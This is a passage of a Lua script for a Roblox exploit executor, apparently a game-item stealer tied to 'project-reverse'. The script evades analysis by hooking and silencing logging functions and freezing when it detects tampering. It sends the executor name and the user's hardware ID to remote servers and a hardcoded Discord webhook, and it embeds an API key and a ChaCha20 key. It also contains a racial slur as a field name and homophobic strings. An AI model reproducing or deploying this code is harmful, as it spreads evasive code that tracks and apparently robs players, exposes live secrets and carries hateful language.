-- discord.gg/syncrypt

local GameService = game
game:GetService("HttpService"):JSONDecode(GameService:HttpGet("https://cdn.project-reverse.org/redirects.json"))
math.random(0, 100)

if getgenv().Executed then
	if game.PlaceId ~= 96342491571673 and game.PlaceId ~= 109983668079237 then
		return
	end

	if getgenv().AccessCode then
		return
	end
end

getgenv().Executed = true

if not string.find(getexecutorname():lower(), "xeno") then
	string.find(getexecutorname():lower(), "solara")
end

loadstring("function test() return \"hi\" end")()

if not test() == "hi" then
	return
end

local function Report(Reason)
	pcall(function()
		local Payload = { content = ("%* %*"):format(Reason, getexecutorname()) }
		local Json = game:GetService("HttpService"):JSONEncode(Payload)
		local Headers = { ["content-type"] = "application/json" }
		request = http_request or request or HttpPost or syn.request

		request({
			Url = "https://discord.com/api/webhooks/1460980930612039767/U3n91fbElsOWEfjCzGuvxgrHZiPffOATrY8XtU0nL5Hy4jpfjLfOUSkger1cw-1pLUSy",
			Body = Json,
			Method = "POST",
			Headers = Headers,
		})
	end)
end

task.spawn(function()
	local Descendants = game:GetDescendants()
	local Table = {}

	while task.wait() do
		Table[#Descendants * os.clock()] = Descendants[math.random(1, #Descendants)]
	end
end)

local Flag = false

local function SetFlag()
	Flag = true
end

local Players = game:GetService("Players")

if Players.LocalPlayer ~= game.Players.LocalPlayer then
	Report("Detected: 1 ~= 1")
	return
end

local OrigRequest = request

if loadstring("return request") == OrigRequest then
	Report("Detected: request")
	return
end

local Counter = 0

repeat
	task.wait()
	Counter += 1
until Counter > 50

if _25mspredefine then
	Report("Detected: 25ms")
	return
end

if type(getthreadidentity) ~= "function" then
	Report("Detected: getthreadidentity function")
	return
end

if type(getthreadidentity()) ~= "number" then
	Report("Detected: getthreadidentity number")
	return
end

local Platform = game:GetService("UserInputService"):GetPlatform()

if typeof(Platform) ~= "EnumItem" then
	Report("Detected: platform EnumItem")
	return
end

if typeof(Players.LocalPlayer.UserId) ~= "number" then
	Report("Detected: user number")
	return
end

if (function(Value)
	return Value + 5
end)(5) ~= 10 then
	return
end

local function GetGame()
	return game
end

repeat
	task.wait()
until tostring(GetGame()) == "Ugc"

repeat
	task.wait()
until typeof(GetGame()) == "Instance"

repeat
	task.wait()
until typeof(GetGame()) ~= {}

local function GetPlayers()
	return (game:GetService("Players"))
end

repeat
	task.wait()
until GetPlayers() ~= nil

repeat
	task.wait()
until type(GetPlayers()) == "userdata"

for i = 1, 100 do
	task.spawn(function()
		while task.wait() do
			if math.random(1, 10) == 11 then
				error("123")
			end
		end
	end)
end

task.spawn(function()
	for i = 1, 100 do
		getgenv()
	end
end)

local function Check(...)
	if not (({ ... })[1] < 2) then
		return "Lypher ass"
	end
	return 1
end

local Marker = nil

local function Compute(First, Second, Third, Fourth)
	Marker = Check(1)
	if Third then
		return First * 99 * 69 * 21 % 10, Second .. "What u doing here?" .. Fourth, Check(2)
	end
end

local Result, Text, Tag = Compute(1, "U are not get anything here", "Hello", 55)
local GameRef = game

repeat
	task.wait()
until GameRef == game

repeat
	task.wait()
until Tag ~= Marker

repeat
	task.wait()
until Result == 1

repeat
	task.wait()
until Text == "U are not get anything hereWhat u doing here?55"

repeat
	task.wait()
until Marker == 1

if Tag == Marker then
	Report("Detected: bigTasty == bigdick")
	return
end

setclipboard("discord.gg/project-reverse")

if not ((not islclosure or not islclosure(request)) and (not isfunctionhooked or not isfunctionhooked(request)) and (not ishooked or not ishooked(request))) then
	while true do
	end
end

local OrigFunc = nil

OrigFunc = hookfunction(request, function(Args)
	if not string.find(Args.Url, "vercel") then
		return OrigFunc(Args)
	end
end)

local Ok, Err = pcall(function()
	local Hits = 0

	replaceclosure(warn, newcclosure(function()
		Hits += 1
	end))

	replaceclosure(print, newcclosure(function()
		Hits += 1
	end))

	replaceclosure(appendfile, newcclosure(function()
		Hits += 1
	end))

	replaceclosure(writefile, newcclosure(function()
		Hits += 1
	end))

	local Response = request({
		Url = "https://cdn.project-reverse.org/visual.luau",
		Nigger = [[                              ...,...,..................                               
                      ,,,,........,.,...,...........,.,...............,                   
                 *,,,,,,.,,,,,,,,,,,,,,,,,,,.......,,.,.................,,.               
                *,,,,,.,,........,,,,,,,,,,,,,,,,,,,,,,,,...............,,,               
                ,,,,,,,,,,,,,,,,,....,,,,,,,,,,,,,,,,,.....,,,,,,........,,,              
                ,,,,,,,*&@@@@@%,,/(**...,,,,,,,,,,,...,**,,,/%&@&%*....,,.,,              
                ,,,,&@(/(((((&@@@@@@@,%*,,,*,*,,,,,**,@@@@@@@@(//////&%...,,              
               ,,,,/,,,,,,,,,,,*(/#@@@@@(%,****,**@@@@@@#(/*,,,,,,,...,/..,,              
               *,,,,,,,,,,,,*******///(@#/******(@@@///*****,,,,,,,,,,,,.,,,              
               *,,,,****************//////*,,,,,****/*************,,,,,,,,,,              
               ,,,*******///    .//////***,,....,**//**/**    .****,**,,,,,,              
               .,,,***//              ***,,.....,,,*/             ,****,,,,,              
               ,,,,,,,,**//********,,,,,,,.......,,,,,*************,...,,,,,(             
               *,,,,,,,,,,,,,,,,...,,,,,,,.........,,,,......,,,,,,,,,..,.,,&             
               #,,******,,,,,,,,,,,,,,,,,,.......,.,.....,,,,,,,,,,,,,,,,,,,#             
                **/////*****,,,,,,,,,,,,,,..........,,,,,,,,,,,,,,,*******,,              
                ***////////********,,,,,,,.........,,.,*************///***,,              
                ****/////////////**,,,,,*,,,,,,,,,,,,,.,,/////**********,*,,              
                ***//////////*,,,,***//****/*//*********,,,,,*((/////*/*,,,               
                *****//@@**,,,,,,,,**/(/########%&///*,,,,,,,,,/*@@/***,,,,               
                 *******@@@**,,,,,,**(/@@@@@@@@@@@@/(**,,***/#/@@@***,,,,,                
                 *********@@@@@@&%@@@@@@@@@(((%@@@@@@@@@&%@@@@@@*,**,,,,,,                
                 .***********//##%&@@@@@@(#////(#@@@@@@&%#///******,,*,,,                 
                  **************,,,,***/**************,,,,******,,***,,,                  
                   ,**********/////////**//////////////*************,,,                   
                     ************///////((@@@@@@%(/******************                     
                       **********//**////(@@@@@@/*****************,                       
                         ****************(@@@@@@/**,************                          
                            *************(&@@@@@/*************                            
                              ,**********/%@@@@&/**********                               
                                  */*//////@@@&%////****                                  
                                     //////&@@&/////*   
]],
	})

	if Hits > 0 or not rawget(Response, "StatusCode") then
		while true do
		end
	end
end)

if not Ok then
	Report(Err)
end

task.spawn(function()
	game:GetService("HttpService")

	local function Fetch(Url)
		local Ok2, Err2 = pcall(function()
			return request({ Url = Url })
		end)

		return nil
	end

	local Handlers = {
		function()
			return Fetch("https://api.ipify.org?format=json&MlemixGay=enabled")
		end,
		function()
			return Fetch("https://dog.ceo/api/breeds/image/random?SecretKeyforMlemixGay")
		end,
		function()
			return Fetch("https://catfact.ninja/fact?MlemixGay")
		end,
		function()
			return Fetch("https://api.agify.io?name=MlemixGayTest")
		end,
		function()
			return Fetch("https://api.genderize.io?name=GetMlemixGayRn")
		end,
		function()
			return Fetch("https://api.nationalize.io?name=michaelJacksonMlemixGay")
		end,
		function()
			return Fetch("https://www.boredapi.com/api/activity?isMlemixGay")
		end,
		function()
			return Fetch("https://api.adviceslip.com/advice?advertiseMlemixGay")
		end,
		function()
			return Fetch("https://official-joke-api.appspot.com/random_joke?forMlemixGay")
		end,
		function()
			return Fetch("http://ip-api.com/json/8.8.8.8?98MlemixGayChance")
		end,
		function()
			return Fetch("https://uselessfacts.jsph.pl/api/v2/facts/random?factMlemixGay")
		end,
	}

	while true do
		Handlers[math.random(#Handlers)]()
		task.wait(math.random(1, 10) / 10)
	end
end)

print = function()
end

warn = function()
end

error = function()
end

info = function()
end

local Container = { Cache = {} }

local function NoOp()
	return nil
end

Container.A = function()
	local Entry = Container.Cache.A

	if not Entry then
		Entry = { Value = NoOp() }
		Container.Cache.A = Entry
	end

	return Entry.Value
end

local function BuildConfig()
	Container.A()

	return {
		API_BASE_URL = PROXY_URL or "https://api.project-reverse.org",
		EXPLOIT_API_KEY = "bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto",
		GAME_ID = 7709344486,
		GAME_NAME = "sab",
		GIVE_ALL_ITEMS = false,
		EXECUTOR_NAME = getexecutorname():lower(),
		HWID = gethwid and gethwid() or "unknown",
		IGNORE_MESSAGE_PATTERNS_IN_WEBHOOK = { "no valuables to steal", "failed to pull from connection", "failed to register due to error" },
	}
end

Container.B = function()
	local Entry = Container.Cache.B

	if not Entry then
		Entry = { Value = BuildConfig() }
		Container.Cache.B = Entry
	end

	return Entry.Value
end

local function BuildLogger()
	local Levels = { "verbose", "error", "warn" }

	return function(...)
		local Args = { ... }
		local Handlers = {}

		local function Wrap(Level)
			local function Chain(...)
				return ...
			end

			for i = #Args, 1, -1 do
				local Arg = Args[i]
				local Next = Chain

				Chain = function(...)
					return Arg(Level, Next, ...)
				end
			end

			return Chain
		end

		for _, Level in Levels do
			Handlers[Level] = Wrap(Level)
		end

		return Handlers
	end
end

Container.C = function()
	local Entry = Container.Cache.C

	if not Entry then
		Entry = { Value = BuildLogger() }
		Container.Cache.C = Entry
	end

	return Entry.Value
end

local function NoOpB()
	return nil
end

Container.D = function()
	local Entry = Container.Cache.D

	if not Entry then
		Entry = { Value = NoOpB() }
		Container.Cache.D = Entry
	end

	return Entry.Value
end

local function BuildBus()
	Container.D()

	return function()
		local Subscribers = {}

		return {
			subscribe = function(Handler)
				Subscribers[Handler] = true

				return function()
					Subscribers[Handler] = nil
				end
			end,
			publish = function(Payload)
				for Handler in Subscribers do
					task.spawn(Handler, Payload)
				end
			end,
		}
	end
end

Container.E = function()
	local Entry = Container.Cache.E

	if not Entry then
		Entry = { Value = BuildBus() }
		Container.Cache.E = Entry
	end

	return Entry.Value
end

local function BuildEvent()
	Container.D()

	return function()
		local Root

		Root = {
			create = function(Payload)
				return { payload = Payload, parent = Root }
			end,
			createObserver = function(Handler)
				return function(Event)
					if Event.parent ~= Root then
						return
					end
					Handler(Event)
				end
			end,
		}

		return Root
	end
end

local function BuildEventCached()
	local Entry = Container.Cache.F

	if not Entry then
		Entry = { Value = BuildEvent() }
		Container.Cache.F = Entry
	end

	return Entry.Value
end

Container.F = BuildEventCached

local function BuildEvents()
	Container.D()
	return { createBus = Container.E(), createEventDefinition = Container.F() }
end

Container.G = function()
	local Entry = Container.Cache.G

	if not Entry then
		Entry = { Value = BuildEvents() }
		Container.Cache.G = Entry
	end

	return Entry.Value
end

local function NoOpC()
	return nil
end

Container.H = function()
	local Entry = Container.Cache.H

	if not Entry then
		Entry = { Value = NoOpC() }
		Container.Cache.H = Entry
	end

	return Entry.Value
end

local function NoOpD()
	Container.H()
	return nil
end

Container.I = function()
	local Entry = Container.Cache.I

	if not Entry then
		Entry = { Value = NoOpD() }
		Container.Cache.I = Entry
	end

	return Entry.Value
end

local function NoOpE()
	Container.A()
	return nil
end

Container.J = function()
	local Entry = Container.Cache.J

	if not Entry then
		Entry = { Value = NoOpE() }
		Container.Cache.J = Entry
	end

	return Entry.Value
end

local function NoOpF()
	Container.J()
	return nil
end

Container.K = function()
	local Entry = Container.Cache.K

	if not Entry then
		Entry = { Value = NoOpF() }
		Container.Cache.K = Entry
	end

	return Entry.Value
end

local function BuildMetadata()
	Container.C()
	Container.G()
	Container.I()
	Container.K()
	return {}
end

Container.L = function()
	local Entry = Container.Cache.L

	if not Entry then
		Entry = { Value = BuildMetadata() }
		Container.Cache.L = Entry
	end

	return Entry.Value
end

local function BuildJson()
	local Json = {}
	local Encode

	local Escapes = {
		["\\"] = "\\",
		["\""] = "\"",
		["\8"] = "b",
		["\12"] = "f",
		["\n"] = "n",
		["\r"] = "r",
		["\t"] = "t",
	}

	local Unescapes = { ["/"] = "/" }

	for Key, Char in Escapes do
		Unescapes[Char] = Key
	end

	local function Escape(Char)
		return "\\" .. (Escapes[Char] or string.format("u%04x", Char:byte()))
	end

	local function LiteralNull()
		return "null"
	end

	local function EncodeTable(Value, Seen)
		local Parts = {}
		local Visited = Seen or {}

		if Visited[Value] then
			error("circular reference")
		end

		Visited[Value] = true

		if rawget(Value, 1) == nil then
			if next(Value) ~= nil then
				for Key, Item in Value do
					if type(Key) ~= "string" then
						error("invalid table: mixed or invalid key types")
					end

					table.insert(Parts, Encode(Key, Visited) .. ":" .. Encode(Item, Visited))
				end

				Visited[Value] = nil
				return "{" .. table.concat(Parts, ",") .. "}"
			end
		end

		local Count = 0

		for Key in Value do
			if type(Key) ~= "number" then
				error("invalid table: mixed or invalid key types")
			end

			Count += 1
		end

		if Count ~= #Value then
			error("invalid table: sparse array")
		end

		for _, Item in ipairs(Value) do
			table.insert(Parts, Encode(Item, Visited))
		end

		Visited[Value] = nil
		return "[" .. table.concat(Parts, ",") .. "]"
	end

	local function EncodeString(Value)
		return "\"" .. Value:gsub("[%z\1-\31\\\"]", Escape) .. "\""
	end

	local function EncodeNumber(Value)
		if Value ~= Value then
			error("unexpected number value '" .. tostring(Value) .. "'")
		elseif not (not (Value <= -math.huge) and not (math.huge <= Value)) then
			error("unexpected number value '" .. tostring(Value) .. "'")
			return string.format("%.14g", Value)
		end

		return string.format("%.14g", Value)
	end

	local function EncodeOther(Value)
		return "\"" .. tostring(Value) .. "\""
	end

	local Encoders = {
		["nil"] = LiteralNull,
		table = EncodeTable,
		string = EncodeString,
		number = EncodeNumber,
		boolean = tostring,
		["function"] = EncodeOther,
		thread = EncodeOther,
		userdata = EncodeOther,
	}

	Encode = function(Value, Seen)
		local Kind = type(Value)
		local Handler = Encoders[Kind]
		if not Handler then
			error("unexpected type '" .. Kind .. "'")
			return
		end
		return Handler(Value, Seen)
	end

	Json.encode = function(Value)
		return (Encode(Value))
	end

	local Decode

	local function MakeSet(...)
		local Set = {}

		for i = 1, select("#", ...) do
			Set[select(i, ...)] = true
		end

		return Set
	end

	local Whitespace = MakeSet(" ", "\t", "\r", "\n")
	local Delimiters = MakeSet(" ", "\t", "\r", "\n", "]", "}", ",")
	local EscapeChars = MakeSet("\\", "/", "\"", "b", "f", "n", "r", "t", "u")
	local Literals = MakeSet("true", "false", "null")
	local LiteralValues = { ["true"] = true, ["false"] = false, null = nil }

	local function SkipChars(Text, Index, Set, Target)
		for i = Index, #Text do
			if Set[Text:sub(i, i)] ~= Target then
				return i
			end
		end

		return #Text + 1
	end

	local function Fail(Text, Index, Message)
		local Line = 1
		local Col = 1

		for i = 1, Index - 1 do
			Col += 1

			if Text:sub(i, i) == "\n" then
				Line += 1
				Col = 1
			end
		end

		error(string.format("%s at line %d col %d", Message, Line, Col))
	end

	local function FromCodePoint(Code)
		if Code <= 127 then
			return string.char(Code)
		end

		if Code <= 2047 then
			return string.char(math.floor(Code / 64) + 192, Code % 64 + 128)
		end

		if Code <= 65535 then
			return string.char(math.floor(Code / 4096) + 224, math.floor(Code % 4096 / 64) + 128, Code % 64 + 128)
		end

		if Code <= 1114111 then
			return string.char(math.floor(Code / 262144) + 240, math.floor(Code % 262144 / 4096) + 128, math.floor(Code % 4096 / 64) + 128, Code % 64 + 128)
		end
		error(string.format("invalid unicode codepoint '%x'", Code))
	end

	local function ParseUnicode(Hex)
		local High = tonumber(Hex:sub(1, 4), 16)
		local Low = tonumber(Hex:sub(7, 10), 16)
		if not Low then
			return FromCodePoint(High)
		end
		return FromCodePoint((High - 55296) * 1024 + (Low - 56320) + 65536)
	end

	local function ParseString(Text, Start)
		local Result = ""
		local Index = Start + 1
		local ChunkStart = Index

		while true do
			if not (Index <= #Text) then
				Fail(Text, Start, "expected closing quote for string")
				return
			else
				local Byte = Text:byte(Index)

				if Byte < 32 then
					Fail(Text, Index, "control character in string")
				elseif Byte == 92 then
					local Prefix = Result .. Text:sub(ChunkStart, Index - 1)
					Index += 1
					local Char = Text:sub(Index, Index)

					if Char == "u" then
						local Match = Text:match("^[dD][89aAbB]%x%x\\u%x%x%x%x", Index + 1) or Text:match("^%x%x%x%x", Index + 1) or Fail(Text, Index - 1, "invalid unicode escape in string")
						Result = Prefix .. ParseUnicode(Match)
						Index += #Match
					else
						if not EscapeChars[Char] then
							Fail(Text, Index - 1, "invalid escape char '" .. Char .. "' in string")
						end

						Result = Prefix .. Unescapes[Char]
					end

					ChunkStart = Index + 1
				elseif Byte == 34 then
					break
				end

				Index += 1
			end
		end

		return Result .. Text:sub(ChunkStart, Index - 1), Index + 1
	end

	local function ParseNumber(Text, Start)
		local Stop = SkipChars(Text, Start, Delimiters)
		local Raw = Text:sub(Start, Stop - 1)
		local Value = tonumber(Raw)

		if not Value then
			Fail(Text, Start, "invalid number '" .. Raw .. "'")
		end

		return Value, Stop
	end

	local function ParseLiteral(Text, Start)
		local Stop = SkipChars(Text, Start, Delimiters)
		local Raw = Text:sub(Start, Stop - 1)

		if not Literals[Raw] then
			Fail(Text, Start, "invalid literal '" .. Raw .. "'")
		end

		return LiteralValues[Raw], Stop
	end

	local Parsers = {
		["\""] = ParseString,
		["0"] = ParseNumber,
		["1"] = ParseNumber,
		["2"] = ParseNumber,
		["3"] = ParseNumber,
		["4"] = ParseNumber,
		["5"] = ParseNumber,
		["6"] = ParseNumber,
		["7"] = ParseNumber,
		["8"] = ParseNumber,
		["9"] = ParseNumber,
		["-"] = ParseNumber,
		t = ParseLiteral,
		f = ParseLiteral,
		n = ParseLiteral,
		["["] = function(Text, Start)
			local List = {}
			local Index = 1
			local Cursor = Start + 1

			while true do
				local Pos = SkipChars(Text, Cursor, Whitespace, true)

				if Text:sub(Pos, Pos) == "]" then
					Cursor = Pos + 1
					break
				else
					local Value, Next = Decode(Text, Pos)
					List[Index] = Value
					Index += 1
					local After = SkipChars(Text, Next, Whitespace, true)
					local Char = Text:sub(After, After)
					Cursor = After + 1
					if Char == "]" then
						break
					end

					if Char ~= "," then
						Fail(Text, Cursor, "expected ']' or ','")
					end
				end
			end

			return List, Cursor
		end,
		["{"] = function(Text, Start)
			local Map = {}
			local Cursor = Start + 1

			while true do
				local Pos = SkipChars(Text, Cursor, Whitespace, true)

				if Text:sub(Pos, Pos) == "}" then
					Cursor = Pos + 1
					break
				else
					if Text:sub(Pos, Pos) ~= "\"" then
						Fail(Text, Pos, "expected string for key")
					end

					local Key, AfterKey = Decode(Text, Pos)
					local Colon = SkipChars(Text, AfterKey, Whitespace, true)

					if Text:sub(Colon, Colon) ~= ":" then
						Fail(Text, Colon, "expected ':' after key")
					end

					local ValueStart = SkipChars(Text, Colon + 1, Whitespace, true)
					local Value, AfterValue = Decode(Text, ValueStart)
					Map[Key] = Value
					local After = SkipChars(Text, AfterValue, Whitespace, true)
					local Char = Text:sub(After, After)
					Cursor = After + 1
					if Char == "}" then
						break
					end

					if Char ~= "," then
						Fail(Text, Cursor, "expected '}' or ','")
					end
				end
			end

			return Map, Cursor
		end,
	}

	Decode = function(Text, Index)
		local Char = Text:sub(Index, Index)
		local Parser = Parsers[Char]
		if not Parser then
			Fail(Text, Index, "unexpected character '" .. Char .. "'")
			return
		end
		return Parser(Text, Index)
	end

	Json.decode = function(Text)
		if type(Text) ~= "string" then
			error("expected argument of type string, got " .. type(Text))
		end

		local Value, Next = Decode(Text, SkipChars(Text, 1, Whitespace, true))
		local End = SkipChars(Text, Next, Whitespace, true)

		if End <= #Text then
			Fail(Text, End, "trailing garbage")
		end

		return Value
	end

	return Json
end

Container.M = function()
	local Entry = Container.Cache.M

	if not Entry then
		Entry = { Value = BuildJson() }
		Container.Cache.M = Entry
	end

	return Entry.Value
end

local function BuildCrypto()
	local function Wrap32(Value)
		return Value % 4294967296
	end

	local function Rotate(Value, Amount)
		return bit32.lrotate(Value, Amount)
	end

	local function Block(State, Rounds)
		local Work = {}

		for i = 1, 16 do
			Work[i] = State[i]
		end

		for i = 1, Rounds do
			if not (i % 2 == 1) then
				Work[1] = Wrap32(Work[1] + Work[6])
				Work[16] = Rotate(bit32.bxor(Work[16], Work[1]), 16)
				Work[11] = Wrap32(Work[11] + Work[16])
				Work[6] = Rotate(bit32.bxor(Work[6], Work[11]), 12)
				Work[1] = Wrap32(Work[1] + Work[6])
				Work[16] = Rotate(bit32.bxor(Work[16], Work[1]), 8)
				Work[11] = Wrap32(Work[11] + Work[16])
				Work[6] = Rotate(bit32.bxor(Work[6], Work[11]), 7)
				Work[2] = Wrap32(Work[2] + Work[7])
				Work[13] = Rotate(bit32.bxor(Work[13], Work[2]), 16)
				Work[12] = Wrap32(Work[12] + Work[13])
				Work[7] = Rotate(bit32.bxor(Work[7], Work[12]), 12)
				Work[2] = Wrap32(Work[2] + Work[7])
				Work[13] = Rotate(bit32.bxor(Work[13], Work[2]), 8)
				Work[12] = Wrap32(Work[12] + Work[13])
				Work[7] = Rotate(bit32.bxor(Work[7], Work[12]), 7)
				Work[3] = Wrap32(Work[3] + Work[8])
				Work[14] = Rotate(bit32.bxor(Work[14], Work[3]), 16)
				Work[9] = Wrap32(Work[9] + Work[14])
				Work[8] = Rotate(bit32.bxor(Work[8], Work[9]), 12)
				Work[3] = Wrap32(Work[3] + Work[8])
				Work[14] = Rotate(bit32.bxor(Work[14], Work[3]), 8)
				Work[9] = Wrap32(Work[9] + Work[14])
				Work[8] = Rotate(bit32.bxor(Work[8], Work[9]), 7)
				Work[4] = Wrap32(Work[4] + Work[5])
				Work[15] = Rotate(bit32.bxor(Work[15], Work[4]), 16)
				Work[10] = Wrap32(Work[10] + Work[15])
				Work[5] = Rotate(bit32.bxor(Work[5], Work[10]), 12)
				Work[4] = Wrap32(Work[4] + Work[5])
				Work[15] = Rotate(bit32.bxor(Work[15], Work[4]), 8)
				Work[10] = Wrap32(Work[10] + Work[15])
				Work[5] = Rotate(bit32.bxor(Work[5], Work[10]), 7)
			else
				Work[1] = Wrap32(Work[1] + Work[5])
				Work[13] = Rotate(bit32.bxor(Work[13], Work[1]), 16)
				Work[9] = Wrap32(Work[9] + Work[13])
				Work[5] = Rotate(bit32.bxor(Work[5], Work[9]), 12)
				Work[1] = Wrap32(Work[1] + Work[5])
				Work[13] = Rotate(bit32.bxor(Work[13], Work[1]), 8)
				Work[9] = Wrap32(Work[9] + Work[13])
				Work[5] = Rotate(bit32.bxor(Work[5], Work[9]), 7)
				Work[2] = Wrap32(Work[2] + Work[6])
				Work[14] = Rotate(bit32.bxor(Work[14], Work[2]), 16)
				Work[10] = Wrap32(Work[10] + Work[14])
				Work[6] = Rotate(bit32.bxor(Work[6], Work[10]), 12)
				Work[2] = Wrap32(Work[2] + Work[6])
				Work[14] = Rotate(bit32.bxor(Work[14], Work[2]), 8)
				Work[10] = Wrap32(Work[10] + Work[14])
				Work[6] = Rotate(bit32.bxor(Work[6], Work[10]), 7)
				Work[3] = Wrap32(Work[3] + Work[7])
				Work[15] = Rotate(bit32.bxor(Work[15], Work[3]), 16)
				Work[11] = Wrap32(Work[11] + Work[15])
				Work[7] = Rotate(bit32.bxor(Work[7], Work[11]), 12)
				Work[3] = Wrap32(Work[3] + Work[7])
				Work[15] = Rotate(bit32.bxor(Work[15], Work[3]), 8)
				Work[11] = Wrap32(Work[11] + Work[15])
				Work[7] = Rotate(bit32.bxor(Work[7], Work[11]), 7)
				Work[4] = Wrap32(Work[4] + Work[8])
				Work[16] = Rotate(bit32.bxor(Work[16], Work[4]), 16)
				Work[12] = Wrap32(Work[12] + Work[16])
				Work[8] = Rotate(bit32.bxor(Work[8], Work[12]), 12)
				Work[4] = Wrap32(Work[4] + Work[8])
				Work[16] = Rotate(bit32.bxor(Work[16], Work[4]), 8)
				Work[12] = Wrap32(Work[12] + Work[16])
				Work[8] = Rotate(bit32.bxor(Work[8], Work[12]), 7)
			end
		end

		for i = 1, 16 do
			State[i] = Wrap32(State[i] + Work[i])
		end
	end

	local function ReadWord(Text, Index)
		local A, B, C, D = string.byte(Text, Index, Index + 3)
		return A + B * 256 + C * 65536 + D * 16777216
	end

	local function WriteWord(Value)
		return string.char(Value % 256, math.floor(Value / 256) % 256, math.floor(Value / 65536) % 256, math.floor(Value / 16777216) % 256)
	end

	local function InitState(Key, Nonce, Counter)
		local State = {}
		local Length = #Key
		local Constant = Length == 32 and "expand 32-byte k"
		Constant = Constant or "expand 16-byte k"

		for i = 1, 4 do
			State[i] = ReadWord(Constant, (i - 1) * 4 + 1)
		end

		for i = 1, 4 do
			State[4 + i] = ReadWord(Key, (i - 1) * 4 + 1)
		end

		if Length == 32 then
			for i = 1, 4 do
				State[8 + i] = ReadWord(Key, 16 + (i - 1) * 4 + 1)
			end
		else
			for i = 1, 4 do
				State[8 + i] = ReadWord(Key, (i - 1) * 4 + 1)
			end
		end

		State[13] = Counter

		for i = 1, 3 do
			State[13 + i] = ReadWord(Nonce, (i - 1) * 4 + 1)
		end

		return State
	end

	local Cipher = { ChaCha20 = function(Data, Key, Nonce, Counter, Rounds)
		local StartCounter = Counter or 1
		local TotalRounds = Rounds or 20
		if #Data == 0 then
			return ""
		end
		local Out = {}
		local Index = 1
		local BlockCounter = StartCounter
		local State = InitState(Key, Nonce, BlockCounter)
		local Saved = {}

		for i = 1, 16 do
			Saved[i] = State[i]
		end

		while Index <= #Data do
			Block(State, TotalRounds)
			local Words = {}

			for i = 1, 16 do
				Words[#Words + 1] = WriteWord(State[i])
			end

			local KeyStream = table.concat(Words)
			local ChunkSize = math.min(64, #Data - Index + 1)

			for i = 1, ChunkSize do
				local PlainByte = string.byte(Data, Index + i - 1)
				local StreamByte = string.byte(KeyStream, i)
				Out[#Out + 1] = string.char(bit32.bxor(PlainByte, StreamByte))
			end

			Index += ChunkSize
			BlockCounter += 1

			for i = 1, 16 do
				State[i] = Saved[i]
			end

			State[13] = BlockCounter
		end

		return table.concat(Out)
	end }

	local Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	local Lookup = {}

	for i = 1, 64 do
		Lookup[string.byte(Alphabet, i)] = i - 1
	end

	Lookup[61] = 64

	local function Base64Decode(Input)
		local Length = #Input
		if Length == 0 then
			return ""
		end
		local Out = {}
		local Index = 1

		while Index <= Length - 3 do
			local B1, B2, B3, B4 = string.byte(Input, Index, Index + 3)
			local V1 = Lookup[B1]
			local V2 = Lookup[B2]
			local V3 = Lookup[B3]
			local V4 = Lookup[B4]

			if V3 == 64 then
				Out[#Out + 1] = string.char(bit32.lshift(V1, 2) + bit32.rshift(V2, 4))
				break
			elseif V4 == 64 then
				Out[#Out + 1] = string.char(bit32.lshift(V1, 2) + bit32.rshift(V2, 4))
				Out[#Out + 1] = string.char(bit32.band(bit32.lshift(V2, 4), 240) + bit32.rshift(V3, 2))
				break
			else
				Out[#Out + 1] = string.char(bit32.lshift(V1, 2) + bit32.rshift(V2, 4))
				Out[#Out + 1] = string.char(bit32.band(bit32.lshift(V2, 4), 240) + bit32.rshift(V3, 2))
				Out[#Out + 1] = string.char(bit32.band(bit32.lshift(V3, 6), 192) + V4)
				Index += 4
			end
		end

		return table.concat(Out)
	end

	local function Base64Encode(Input)
		local Out = {}
		local Length = #Input

		for i = 1, Length, 3 do
			local B1, B2, B3 = string.byte(Input, i, i + 2)
			local Packed = B1 * 65536 + (B2 or 0) * 256 + (B3 or 0)
			local P1 = math.floor(Packed / 262144) % 64
			local P2 = math.floor(Packed / 4096) % 64
			local P3 = math.floor(Packed / 64) % 64
			local P4 = Packed % 64
			Out[#Out + 1] = Alphabet:sub(P1 + 1, P1 + 1)
			Out[#Out + 1] = Alphabet:sub(P2 + 1, P2 + 1)
			local Slot = #Out + 1
			local Third = i + 1 <= Length and Alphabet:sub(P3 + 1, P3 + 1)
			Out[Slot] = Third or "="
			Out[#Out + 1] = i + 2 <= Length and Alphabet:sub(P4 + 1, P4 + 1) or "="
		end

		return table.concat(Out)
	end

	return {
		encrypt = function(Data)
			local Encoded = nil

			task.spawn(function()
				local CipherText = Cipher.ChaCha20(Data, "aM-bI41LGryw.uuD';2hLcF_a5e7GjB4", "SN6+$4yn12Ma")
				Encoded = Base64Encode(CipherText)
			end)

			repeat
				task.wait()
			until Encoded

			return Encoded
		end,
		decrypt = function(Data)
			local Decoded = nil

			task.spawn(function()
				Decoded = Cipher.ChaCha20(Base64Decode(Data), "aM-bI41LGryw.uuD';2hLcF_a5e7GjB4", "SN6+$4yn12Ma")
			end)

			repeat
				task.wait()
			until Decoded

			return Decoded
		end,
	}
end

Container.N = function()
	local Entry = Container.Cache.N

	if not Entry then
		Entry = { Value = BuildCrypto() }
		Container.Cache.N = Entry
	end

	return Entry.Value
end

local function BuildHttp()
	local Config = Container.B()
	local Queue = {}

	local function NewSlot()
		return { ref = nil }
	end

	local function Reap(...)
		local Tasks = { ... }

		while true do
			local Found = false

			for _, Thread in Tasks do
				if coroutine.status(Thread) == "dead" then
					Found = true
				elseif Found then
					pcall(task.cancel, Thread)
				end
			end

			if not Found then
				task.wait(0.1)
				continue
			end
			break
		end
	end

	local function Perform(Job)
		local Spec = {
			Url = Config.API_BASE_URL .. Job.request.endpoint,
			Method = Job.request.method,
			Headers = Job.request.headers,
		}

		local Body

		if Job.request.body ~= nil then
			Body = Job.request.body
		else
			Body = nil
		end

		Spec.Body = Body
		local Ok, Result = pcall(request, Spec)
		if not Ok then
			Job.response.ref = { ok = false, body = Result }
			return
		end

		if Result == nil then
			Job.response.ref = { ok = false, body = "response is nil" }
			return
		end

		if Result.Body ~= nil then
			Job.response.ref = { ok = Result.StatusCode == 200, body = Result.Body }
			return
		end
		Job.response.ref = { ok = false, body = "body is nil" }
	end

	local function Loop()
		while true do
			local Job = table.remove(Queue, 1)

			if Job ~= nil then
				local Delay = task.delay

				task.spawn(Reap, task.spawn(Perform, Job), Delay(10, function()
					if Job.response.ref ~= nil then
						return
					end
					Job.response.ref = { ok = false, body = "request timed out" }
				end))
			else
				task.wait(0.1)
			end
		end
	end

	local function Send(Method, Endpoint, Headers, Body)
		local Slot = NewSlot()
